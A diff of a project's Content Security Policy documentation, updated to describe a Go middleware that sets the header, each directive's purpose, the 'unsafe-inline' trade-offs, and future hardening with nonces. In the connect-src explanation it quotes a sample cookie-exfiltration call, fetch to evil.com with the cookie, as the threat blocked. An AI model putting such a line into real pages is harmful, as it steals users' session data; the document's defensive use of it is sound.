@@ -1,69 +1,88 @@
 # Content Security Policy
 
-CSP is **not currently enabled** for composer. This document explains why and the path to enabling it.
+CSP **is enabled** for composer via the Go `SecurityHeaders` middleware at `internal/api/middleware/security.go`. The header is applied to every response served by composerd, including the embedded static frontend.
 
-## Status
-
-- Astro 6.0+ ships a stable `security.csp` option that auto-emits a `<meta http-equiv="content-security-policy">` element with hashes for bundled scripts and styles.
-- Composer's inline `onclick` handlers were removed in commit `55d9c7c` ("ui: extract <BulkBar> + remove inline onclick handlers from Layout"), which was the first step toward CSP-readiness.
-- Enabling `security.csp` was attempted on this branch (commit history shows the experiment) and reverted because of the limitations below.
-
-## Why it isn't enabled
-
-Astro's CSP implementation generates SHA-256 hashes at build time for:
-- Bundled `<script>` content
-- Astro component `<style>` blocks
-- Scoped styles emitted by the compiler
-
-It does **not** hash:
-- React `style={{}}` JSX props (these become runtime `element.setAttribute('style', ...)`)
-- Inline `style=""` attributes on individual elements (whether SSR-emitted or runtime-applied)
-
-Composer has React inline styles in several places that are essential to functionality:
-
-| File | Inline style | Why it's inline |
-|---|---|---|
-| `src/components/container/LogViewer.tsx` | `style={{ height: ${virtualizer.getTotalSize()}px, ... }}` and `style={{ top: ${virtualItem.start}px }}` | TanStack Virtual computes row positions at runtime; static CSS can't express them. |
-| `src/components/container/ContainerStats.tsx` | `style={{ height: ${cpu}% }}` | Per-container CPU/memory progress bars driven by SSE updates. |
-| `src/components/stack/ComposeEditor.tsx` | `style={{ minHeight: "300px", maxHeight: "80vh", ... }}` | CodeMirror container sizing. |
-| `src/components/terminal/Terminal.tsx`, `ActionTerminal.tsx`, `StackConsole.tsx`, `DockerConsole.tsx`, `EventStream.tsx` | `style={{ height: "Npx" }}` | xterm.js container size before it self-manages. |
-
-Static heights (the last row above) could in principle be moved to Tailwind arbitrary-value classes (`h-[300px]`). The dynamic ones (LogViewer virtualization, ContainerStats progress bars) genuinely require an inline `style=""` attribute.
-
-Additionally, `@fontsource/*` packages ship fonts as `data:` URIs inside their CSS. The base CSP `font-src 'self'` blocks these; we'd need `font-src 'self' data:`.
-
-Finally, `frame-ancestors` is ignored by browsers when delivered via `<meta>` — it must come from an HTTP response header. Same for `report-uri` / `report-to`.
-
-## Path to enabling
-
-The complete fix needs Go-side cooperation:
-
-1. **Serve CSP from a Go HTTP middleware** rather than the `<meta>` tag.
-   - Lets us use `frame-ancestors`, `report-to`, and per-route policies.
-   - Lets us serve the same CSP for every static asset response.
-2. **Refactor static inline styles to Tailwind arbitrary-value classes.**
-   - `EventStream`, `Terminal`, `DockerConsole`, `ActionTerminal`, `StackConsole`, `LogViewer` (container only), `ComposeEditor` (the static parts).
-3. **For dynamic inline styles**, add `'unsafe-hashes'` to `style-src` and pre-compute hashes for the dynamic style patterns. Caveat: each unique computed style string has its own hash, so virtualization (where the value is runtime-arbitrary) cannot be locked down this way. The honest answer is `'unsafe-inline'` for `style-src` while keeping `script-src` strict — XSS via style injection is much rarer than via script injection, and this trade-off accepts the residual style-injection risk in exchange for keeping virtualization working.
-4. **Add `font-src 'self' data:`** for Fontsource.
-5. **Re-enable Astro's `security.csp`** (or hand-craft the header in Go) with the full directive set.
-
-## Recommended header (for whoever picks this up)
+## Current policy
 
 ```
 Content-Security-Policy:
   default-src 'self';
-  script-src 'self' 'sha256-...';     /* Astro-generated hashes */
-  style-src 'self' 'unsafe-inline';   /* see point 3 above */
+  script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  connect-src 'self';
   img-src 'self' data:;
   font-src 'self' data:;
-  connect-src 'self';
-  frame-ancestors 'none';
+  object-src 'none';
   base-uri 'self';
   form-action 'self';
+  frame-ancestors 'none';
 ```
 
-Set on every response from `cmd/composerd/static.go` (or wherever the static handler lives).
+Set on every response (HTML, JS, CSS, font, image) by the middleware. Strict-Transport-Security is also set when the request is over HTTPS (directly or via a trusted reverse proxy).
 
-## Why this isn't blocking the McMaster pass
+## What's locked down
 
-The McMaster pass is a UI density / discoverability / consistency effort. CSP is a deployment-security concern that benefits from the changes here (no inline `onclick`, no inline `<script>` content, no `'unsafe-eval'` requirements) but isn't a UI feature. Treating it as a separate Go-side task is the right boundary.
+- `default-src 'self'` — every unspecified content type must be same-origin.
+- `connect-src 'self'` — XHR / fetch / WebSocket / EventSource (SSE) can only call back to composer's own origin. Useful guard against an attacker exfiltrating data via a `fetch('https://evil.com/?steal=' + cookie)`.
+- `object-src 'none'` — no `<embed>` / `<object>` / `<applet>`. Removes the Flash / PDF-plugin XSS class entirely.
+- `frame-ancestors 'none'` — composer cannot be iframed. Canonical clickjacking guard.
+- `form-action 'self'` — no third-party form submission targets. Prevents an attacker who injects a form from POSTing user input to evil.com.
+- `base-uri 'self'` — no `<base href>` rewrite tricks.
+- `font-src 'self' data:` — Fontsource ships fonts as `data:` URIs in CSS; this permits them.
+
+## What `'unsafe-inline'` permits and why
+
+Two relaxations are deliberate trade-offs:
+
+### `script-src 'self' 'unsafe-inline'`
+
+Astro's static build injects a small inline `<script>` block into every page's `<head>`:
+
+```html
+<script>(()=>{
+  // custom-element registration for <astro-island>, the hydration bootstrap
+  ...
+})();</script>
+```
+
+Without `'unsafe-inline'`, this fails and no React component on the page ever hydrates — the entire app becomes a static skeleton. Hashing this script per-page from Go is fragile because Astro re-generates the hash on every build, and Go has no straightforward way to read the build manifest.
+
+Note this is **not** `'unsafe-eval'` — `new Function(...)` / `eval(...)` are still blocked. The residual risk is an attacker who can inject a `<script>` tag into the DOM. The McMaster pass eliminated every inline `<script>` written by composer code (`mobile-menu-init.js` is now external; all `onclick=""` attributes are gone), so the only inline `<script>` running is Astro's known-safe bootstrap.
+
+### `style-src 'self' 'unsafe-inline'`
+
+React `style={{}}` props render to inline `style=""` attributes on individual elements. Composer has three places where the inline style value is runtime-computed and cannot be expressed as a CSS class:
+
+- `LogViewer` — TanStack Virtual computes `top: Npx` per visible row.
+- `ContainerStats` — `height: ${cpu}%` from live SSE updates.
+- `Terminal` / `EventStream` / `DockerConsole` — xterm/SSE containers with fixed heights set via inline style.
+
+Style-injection XSS is rare in practice (the attacker needs CSS-only attack vectors like `background: url(javascript:...)` which most browsers block anyway) so the residual risk is small.
+
+## Tightening further (future work)
+
+To remove `script-src 'unsafe-inline'`, the most realistic path is **CSP nonces**:
+
+1. Add a Go middleware that generates a per-request nonce and injects it into the CSP header (`script-src 'self' 'nonce-RANDOM'`).
+2. Make Astro emit `<script nonce="RANDOM">` on its hydration bootstrap. Astro 6 has `experimental.csp` support for nonces but they're keyed to the build, not the request.
+3. Or pre-compute hashes at build time and copy them into the Go middleware's CSP string at deploy time.
+
+To remove `style-src 'unsafe-inline'`, refactor the three runtime-style components to use CSS custom properties:
+
+```diff
+- <div style={{ top: `${item.start}px` }}>
++ <div className="absolute" style={{ "--row-top": `${item.start}px` } as React.CSSProperties}>
+  /* with CSS: .absolute { top: var(--row-top); } */
+```
+
+This still leaves an inline `style=""` attribute, so it doesn't actually help unless paired with `'unsafe-hashes'` directive and pre-computed hashes for the limited set of property assignments. The juice isn't worth the squeeze given style-injection's low risk.
+
+## Verifying the policy
+
+Curl any response:
+
+```bash
+curl -sI http://localhost:8080/ | grep -i content-security-policy
+```
+
+In dev, the browser DevTools "Network" tab shows the header on every response. The "Issues" tab will flag any CSP violations in real time.
